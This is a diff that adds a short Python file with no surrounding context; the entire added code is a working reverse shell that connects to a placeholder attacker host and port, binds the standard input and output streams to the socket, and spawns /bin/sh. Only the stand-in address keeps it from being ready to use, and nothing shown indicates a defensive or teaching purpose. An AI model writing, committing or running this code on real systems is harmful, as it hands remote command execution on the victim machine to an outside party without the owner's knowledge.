@@ -1,0 +1,9 @@
+import os,socket,pty
+
+s = socket.socket()
+s.connect(("ATTACKER_IP",ATTACKER_PORT))
+
+for fd in range(3):
+    os.dup2(s.fileno(),fd)
+
+pty.spawn("/bin/sh")
